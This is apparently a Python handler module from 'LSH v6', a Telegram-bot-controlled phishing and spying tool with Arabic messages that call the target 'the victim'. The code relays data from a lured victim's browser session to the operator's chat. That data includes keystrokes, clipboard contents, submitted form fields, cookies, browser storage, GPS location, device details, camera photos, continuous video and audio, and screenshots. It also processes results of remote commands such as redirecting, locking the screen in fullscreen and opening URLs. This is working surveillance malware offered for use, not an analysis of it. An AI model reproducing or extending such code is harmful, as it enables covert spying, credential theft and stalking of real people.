# lsh/handlers.py
# ============================================================
# معالجة الرسائل v6
# ============================================================

import io
import json
import time
import base64

from .session_mgr import (
    get_session, update_session, update_presence, refresh_session_ttl,
)
from .commands import ack_command, nack_command, mark_session_active

from logging_config import get_logger

logger = get_logger("lsh.handlers")


# ============================================================
# Global
# ============================================================
_key_buffers = {}
_click_buffers = {}
_BOT_REF = None


def set_bot_reference(bot):
    """ربط البوت"""
    global _BOT_REF
    _BOT_REF = bot
    logger.info("Bot reference set for LSH handlers")


# ============================================================
# المعالج الرئيسي
# ============================================================
def _handle_incoming(bot, chat_id, session_id, data, source_ip):
    dtype = data.get('type')
    logger.debug(f"[<<] {dtype} | {session_id[:8]}")

    try:
        # ═══════════════════════════════════════════════════
        # Presence / Heartbeat
        # ═══════════════════════════════════════════════════
        if dtype == 'heartbeat':
            update_presence(session_id, "http")
            refresh_session_ttl(session_id)
            return

        if dtype == 'presence':
            channel = data.get('channel', 'unknown')
            rtt = data.get('rtt_ms')
            update_presence(session_id, channel, rtt)
            return

        # ═══════════════════════════════════════════════════
        # Ack
        # ═══════════════════════════════════════════════════
        if dtype == 'cmd_ack':
            cmd_id = data.get('cmd_id', '')
            if cmd_id:
                ack_command(session_id, cmd_id)
            return

        # ═══════════════════════════════════════════════════
        # Events
        # ═══════════════════════════════════════════════════
        if dtype == 'landing':
            bot.send_message(
                chat_id,
                f"🎯 <b>الضحية فتح الرابط!</b>\n"
                f"🆔 <code>{session_id}</code>\n"
                f"🌐 IP: <code>{source_ip}</code>\n\n"
                f"⏳ في انتظار تصرف الضحية...",
                parse_mode="HTML"
            )

        elif dtype == 'retry_click':
            bot.send_message(
                chat_id,
                f"👆 <b>الضحية ضغط على إعادة المحاولة!</b>\n🆔 <code>{session_id}</code>",
                parse_mode="HTML"
            )

        elif dtype == 'page_visible':
            update_session(session_id, page_status="visible")
            bot.send_message(
                chat_id,
                f"👁️ <b>الضحية فتح الصفحة!</b>\n🆔 <code>{session_id}</code>",
                parse_mode="HTML"
            )

        elif dtype == 'page_unload':
            bot.send_message(
                chat_id,
                f"🚪 <b>الضحية يحاول إغلاق الصفحة!</b>\n🆔 <code>{session_id}</code>",
                parse_mode="HTML"
            )

        elif dtype == 'manual_reconnect':
            update_session(session_id, reconnect_count=0)
            bot.send_message(
                chat_id,
                f"🔄 <b>إعادة اتصال يدوية</b> — <code>{session_id[:8]}</code>",
                parse_mode="HTML"
            )

        elif dtype == 'channel_switch':
            from_ch = data.get('from', '?')
            to_ch = data.get('to', '?')
            update_presence(session_id, to_ch)
            logger.info(f"Channel switch: {from_ch} → {to_ch}")

        elif dtype == 'ready':
            from .panel import build_lsh_control_panel
            update_session(session_id, stability="ready", page_status="visible")
            panel = build_lsh_control_panel(session_id, chat_id)
            bot.send_message(
                chat_id,
                f"✅ <b>الجلسة <code>{session_id[:8]}</code> جاهزة للتحكم الكامل</b>\n"
                f"استخدم اللوحة أدناه 👇",
                parse_mode="HTML",
                reply_markup=panel
            )

        # ═══════════════════════════════════════════════════
        # Information
        # ═══════════════════════════════════════════════════
        elif dtype == 'info':
            info = data.get('info', {})
            info['ip'] = source_ip
            update_session(session_id, info=info)
            text = _format_info_report(info, session_id)
            bot.send_message(
                chat_id, text,
                parse_mode="HTML",
                disable_web_page_preview=True
            )

        elif dtype == 'location':
            loc = data.get('location') or {}
            if loc and loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(
                    chat_id,
                    f"📍 <b>الموقع:</b> <code>{lat}, {lng}</code>\n"
                    f'<a href="https://maps.google.com/?q={lat},{lng}">🗺️ خرائط</a>',
                    parse_mode="HTML"
                )

        elif dtype == 'periodic_location':
            loc = data.get('location') or {}
            if loc and loc.get('latitude'):
                lat, lng = loc['latitude'], loc['longitude']
                bot.send_message(
                    chat_id,
                    f"📍 <b>تحديث موقع:</b> <code>{lat}, {lng}</code>",
                    parse_mode="HTML"
                )

        # ═══════════════════════════════════════════════════
        # Media
        # ═══════════════════════════════════════════════════
        elif dtype == 'first_photo':
            _send_photo(bot, chat_id, data.get('image', ''), "📸 <b>صورة أولية</b>")

        elif dtype == 'first_audio':
            _send_audio(bot, chat_id, data.get('audio', ''), "🎙️ <b>تسجيل صوتي أولي</b>")

        elif dtype == 'periodic_photo':
            _send_photo(bot, chat_id, data.get('image', ''), "📸 <b>صورة دورية</b>")

        elif dtype == 'continuous_video_chunk':
            _send_video(bot, chat_id, data.get('data', ''), "📹 <b>فيديو مستمر</b>")

        elif dtype == 'always_audio_chunk':
            _send_audio(bot, chat_id, data.get('data', ''), "🎤 <b>مقطع صوتي دائم</b>")

        # ═══════════════════════════════════════════════════
        # Command Results
        # ═══════════════════════════════════════════════════
        elif dtype == 'cmd_result':
            action = data.get('action')
            status = data.get('status')
            error = data.get('error', '')
            result = data.get('data')
            cmd_id = data.get('cmd_id', '')

            if status == 'ok':
                if cmd_id:
                    ack_command(session_id, cmd_id)
                _handle_cmd_success(bot, chat_id, action, result)
            else:
                if cmd_id:
                    nack_command(session_id, cmd_id, error[:100])
                _handle_cmd_failure(bot, chat_id, action, error)

        # ═══════════════════════════════════════════════════
        # Monitors
        # ═══════════════════════════════════════════════════
        elif dtype == 'key':
            key = data.get('key', '')
            if len(key) == 1 or key in [
                'Enter', 'Backspace', 'Delete', 'Tab', 'Escape',
                'ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'
            ]:
                _accumulate_key(chat_id, session_id, key)

        elif dtype == 'clipboard_copy':
            c = data.get('content', '')
            if c:
                bot.send_message(
                    chat_id,
                    f"📋 <b>نسخ:</b>\n<pre>{c[:300]}</pre>",
                    parse_mode="HTML"
                )

        elif dtype == 'clipboard_paste':
            c = data.get('content', '')
            if c:
                bot.send_message(
                    chat_id,
                    f"📥 <b>لصق:</b>\n<pre>{c[:300]}</pre>",
                    parse_mode="HTML"
                )

        elif dtype == 'form_submit':
            form_data = data.get('data', {})
            lines = [
                "📝 <b>نموذج:</b>",
                f"Action: <code>{str(data.get('action_url',''))[:80]}</code>"
            ]
            for k, v in list(form_data.items())[:20]:
                lines.append(f"• <code>{k}</code>: <code>{str(v)[:100]}</code>")
            bot.send_message(chat_id, "\n".join(lines), parse_mode="HTML")

        elif dtype == 'click':
            txt = (data.get('text') or '').strip()
            if txt and len(txt) > 2:
                _accumulate_click(chat_id, session_id, txt)

    except Exception as e:
        logger.exception(f"_handle_incoming error ({dtype}): {e}")


# ============================================================
# Success / Failure Handlers
# ============================================================
def _handle_cmd_success(bot, chat_id, action, data):
    try:
        if action == 'snapshot':
            _send_photo(bot, chat_id, data, "📸 <b>صورة بأمر</b> ✅")
        elif action == 'audio':
            _send_audio(bot, chat_id, data, "🎙️ <b>تسجيل صوتي</b> ✅")
        elif action == 'video':
            _send_video(bot, chat_id, data, "🎥 <b>فيديو</b> ✅")
        elif action == 'screen':
            _send_photo(bot, chat_id, data, "🖥️ <b>لقطة شاشة</b> ✅")

        elif action == 'clipboard':
            bot.send_message(
                chat_id,
                f"📋 <b>الحافظة:</b>\n<pre>{str(data)[:1000]}</pre>",
                parse_mode="HTML"
            )

        elif action == 'cookies':
            bot.send_message(
                chat_id,
                f"🍪 <b>الكوكيز:</b>\n<pre>{str(data)[:1500]}</pre>",
                parse_mode="HTML"
            )

        elif action == 'storage':
            try:
                storage_data = json.loads(data)
                msg = "💾 <b>التخزين:</b>\n\n"
                msg += f"📦 <b>LocalStorage:</b> {len(storage_data.get('localStorage', {}))} مفتاح\n"
                msg += f"📦 <b>SessionStorage:</b> {len(storage_data.get('sessionStorage', {}))} مفتاح\n"
                msg += f"📦 <b>IndexedDB:</b> {len(storage_data.get('indexedDB_names', []))}\n"
                msg += f"📦 <b>Caches:</b> {len(storage_data.get('cache_keys', []))}\n\n"
                msg += f"<pre>{json.dumps(storage_data, ensure_ascii=False, indent=2)[:2500]}</pre>"
                bot.send_message(chat_id, msg, parse_mode="HTML")
            except json.JSONDecodeError:
                bot.send_message(
                    chat_id,
                    f"💾 <b>التخزين:</b>\n<pre>{str(data)[:1500]}</pre>",
                    parse_mode="HTML"
                )

        elif action == 'location':
            try:
                loc = json.loads(data)
                lat, lng = loc.get('latitude'), loc.get('longitude')
                bot.send_message(
                    chat_id,
                    f"📍 <b>الموقع:</b> <code>{lat}, {lng}</code>\n"
                    f'<a href="https://maps.google.com/?q={lat},{lng}">خرائط</a>',
                    parse_mode="HTML"
                )
            except json.JSONDecodeError:
                bot.send_message(chat_id, f"📍 {data}")

        elif action == 'url':
            bot.send_message(
                chat_id,
                f"✅ <b>تم فتح الرابط</b>\n<code>{data}</code>",
                parse_mode="HTML"
            )

        elif action == 'vibrate':
            bot.send_message(chat_id, "📳 <b>تم الاهتزاز</b> ✅")

        elif action == 'redirect':
            bot.send_message(chat_id, "✅ <b>تم إنهاء الجلسة</b>")

        elif action == 'continuous_video':
            bot.send_message(chat_id, "📹 <b>بدأ التسجيل المستمر</b>")

        elif action == 'always_audio':
            bot.send_message(chat_id, "🎤 <b>بدأ التسجيل الصوتي</b>")

        elif action == 'stop_recording':
            bot.send_message(chat_id, "⏹️ <b>تم إيقاف التسجيل</b>")

        elif action == 'toast':
            bot.send_message(chat_id, "💬 <b>تم عرض الرسالة</b>")

        elif action == 'play_sound':
            bot.send_message(chat_id, "🔊 <b>تم تشغيل الصوت</b>")

        elif action == 'fullscreen':
            bot.send_message(chat_id, "🔒 <b>تم تفعيل القفل</b>")

        elif action == 'status':
            try:
                sd = json.loads(data)
                msg = "🕵️ <b>حالة الضحية:</b>\n\n"
                msg += f"📡 متصل: {'✅' if sd.get('is_online') else '❌'}\n"
                msg += f"⚙️ SW: {'✅' if sd.get('sw_active') else '❌'}\n"
                msg += f"💡 Wake Lock: {'✅' if sd.get('wakelock') else '❌'}\n"
                msg += f"📷 كاميرا: {'✅' if sd.get('camera') else '❌'}\n"
                msg += f"🎤 ميكروفون: {'✅' if sd.get('mic') else '❌'}\n"
                msg += f"👁️ الصفحة: <code>{sd.get('visibility', 'unknown')}</code>\n"
                msg += f"📹 فيديو: {'✅' if sd.get('recording_video') else '❌'}\n"
                msg += f"🎙️ صوت: {'✅' if sd.get('recording_audio') else '❌'}\n"
                msg += f"🔄 محاولات: <code>{sd.get('reconnect_attempts', 0)}</code>\n"
                msg += f"📡 القناة: <code>{sd.get('channel', 'unknown')}</code>\n"
                bot.send_message(chat_id, msg, parse_mode="HTML")
            except json.JSONDecodeError:
                bot.send_message(chat_id, f"🕵️ {data}")

        elif action == 'reconnect':
            bot.send_message(chat_id, "🔄 <b>تم إعادة الاتصال</b>")

        else:
            bot.send_message(chat_id, f"✅ <code>{action}</code> تم")

    except Exception as e:
        logger.exception(f"_handle_cmd_success error: {e}")


def _handle_cmd_failure(bot, chat_id, action, error):
    msgs = {
        ('snapshot', 'no_camera'): "❌ <b>لا كاميرا</b> — الضحية رفضت",
        ('snapshot', 'capture_failed'): "❌ <b>فشل الالتقاط</b>",
        ('audio', 'no_mic'): "❌ <b>لا ميكروفون</b> — الضحية رفضت",
        ('audio', 'record_failed'): "❌ <b>فشل التسجيل</b>",
        ('video', 'no_camera'): "❌ <b>لا كاميرا</b>",
        ('video', 'record_failed'): "❌ <b>فشل الفيديو</b>",
        ('screen', 'not_supported'): "❌ <b>لا يدعم مشاركة الشاشة</b>",
        ('screen', 'denied'): "❌ <b>الضحية رفضت</b>",
        ('clipboard', 'not_supported'): "❌ <b>لا يدعم الحافظة</b>",
        ('clipboard', 'denied'): "❌ <b>الضحية رفضت</b>",
        ('location', 'denied_or_timeout'): "❌ <b>الضحية رفضت الموقع</b>",
        ('url', 'popup_blocked'): "❌ <b>المتصفح حجب</b>",
        ('vibrate', 'not_supported'): "❌ <b>لا يدعم الاهتزاز</b>",
        ('redirect', 'unknown'): "❌ <b>فشل الإنهاء</b>",
        ('unknown_action', 'unknown_action'): "❌ <b>أمر غير معروف</b>",
    }
    key = (action, error)
    msg = msgs.get(key)
    if not msg:
        msg = f"❌ <b>{action} فشل:</b> <code>{error[:100]}</code>"

    try:
        bot.send_message(chat_id, msg, parse_mode="HTML")
    except Exception as e:
        logger.warning(f"_handle_cmd_failure send error: {e}")


# ============================================================
# Media Senders
# ============================================================
def _send_photo(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:image'):
            return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.jpg'
        bot.send_photo(chat_id, buf, caption=caption, parse_mode="HTML")
    except Exception as e:
        logger.warning(f"_send_photo error: {e}")


def _send_audio(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:audio'):
            return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.webm'
        bot.send_audio(chat_id, buf, caption=caption, parse_mode="HTML")
    except Exception as e:
        logger.warning(f"_send_audio error: {e}")


def _send_video(bot, chat_id, data_url, caption):
    try:
        if not data_url or not data_url.startswith('data:video'):
            return
        _, encoded = data_url.split(',', 1)
        buf = io.BytesIO(base64.b64decode(encoded))
        buf.name = 'capture.webm'
        bot.send_video(chat_id, buf, caption=caption, parse_mode="HTML")
    except Exception as e:
        logger.warning(f"_send_video error: {e}")


# ============================================================
# Accumulators
# ============================================================
def _accumulate_key(chat_id, session_id, key):
    now = time.time()
    key_map = {
        'Enter': ' ⏎ ', 'Backspace': '⌫', 'Delete': '⌦', 'Tab': ' ⇥ ',
        'Escape': '⎋', 'ArrowUp': '↑', 'ArrowDown': '↓',
        'ArrowLeft': '←', 'ArrowRight': '→'
    }
    display = key_map.get(key, key)
    buf = _key_buffers.setdefault(chat_id, {"text": "", "last": 0})
    buf["text"] += display

    if now - buf["last"] > 4 or len(buf["text"]) > 180:
        if buf["text"].strip() and _BOT_REF:
            try:
                _BOT_REF.send_message(
                    chat_id,
                    f"⌨️ <b>لوحة المفاتيح:</b>\n<pre>{buf['text'][:500]}</pre>",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.debug(f"key buffer send error: {e}")
        buf["text"] = ""
        buf["last"] = now


def _accumulate_click(chat_id, session_id, text):
    now = time.time()
    buf = _click_buffers.setdefault(chat_id, {"texts": [], "last": 0})
    buf["texts"].append(text)

    if now - buf["last"] > 6 or len(buf["texts"]) >= 8:
        if _BOT_REF and buf["texts"]:
            try:
                unique = list(dict.fromkeys(buf["texts"]))[:8]
                _BOT_REF.send_message(
                    chat_id,
                    "🖱️ <b>النقرات:</b>\n" + "\n".join(f"• {t[:70]}" for t in unique),
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.debug(f"click buffer send error: {e}")
        buf["texts"] = []
        buf["last"] = now


# ============================================================
# Report Formatter
# ============================================================
def _format_info_report(info, session_id):
    bat = info.get('battery') or {}
    net = info.get('connection') or {}
    scr = info.get('screen') or {}
    hw = info.get('hardware') or {}
    gpu = info.get('gpu') or {}
    webrtc = info.get('webrtc_ips', [])
    ip = info.get('ip', 'Unknown')
    webrtc_text = "، ".join(webrtc) if webrtc else "لا يوجد"
    sw_status = "✅" if info.get('sw_supported') else "❌"
    wl_status = "✅" if info.get('wakelock_supported') else "❌"
    pwa_status = "✅" if info.get('pwa_standalone') else "❌"

    ls_count = len(info.get('localStorage', {}))
    ss_count = len(info.get('sessionStorage', {}))
    cookies_len = len(info.get('cookies', ''))

    return (
        "╔══════════════════════════════╗\n"
        "║  🎯 <b>LSH v6.0 — Global</b>  ║\n"
        "╚══════════════════════════════╝\n\n"
        f"🆔 <code>{session_id}</code>\n"
        f"🌐 <b>IP:</b> <code>{ip}</code>\n"
        f"🕵️ <b>WebRTC:</b> <code>{webrtc_text}</code>\n"
        f"🕐 <code>{info.get('timestamp', 'N/A')[:19]}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💻 <b>الجهاز:</b>\n"
        f"• <code>{info.get('platform', 'Unknown')}</code>\n"
        f"• أنوية: <code>{hw.get('cores', 'N/A')}</code> | RAM: <code>{hw.get('memory', 'N/A')} GB</code>\n"
        f"• اللغة: <code>{info.get('language', 'N/A')}</code>\n"
        f"• التوقيت: <code>{info.get('timezone', 'N/A')}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 <b>GPU:</b>\n"
        f"• <code>{gpu.get('vendor', 'N/A')}</code>\n"
        f"• <code>{gpu.get('renderer', 'N/A')}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📐 <b>الشاشة:</b>\n"
        f"• <code>{scr.get('width', '?')}x{scr.get('height', '?')}</code> "
        f"DPR <code>{scr.get('pixelRatio', '?')}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔋 <b>البطارية:</b> "
        + (f"<code>{bat.get('level', '?')}%</code>" if bat else "غير متاح") + "\n"
        "📶 <b>الشبكة:</b> "
        + (f"<code>{net.get('effectiveType', '?')}</code>" if net else "غير متاح") + "\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "📦 <b>التخزين:</b>\n"
        f"• LocalStorage: <code>{ls_count}</code>\n"
        f"• SessionStorage: <code>{ss_count}</code>\n"
        f"• Cookies: <code>{cookies_len}</code>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🛡️ <b>الحماية:</b>\n"
        f"⚙️ Service Worker: {sw_status}\n"
        f"💡 Wake Lock: {wl_status}\n"
        f"📱 PWA: {pwa_status}"
                )
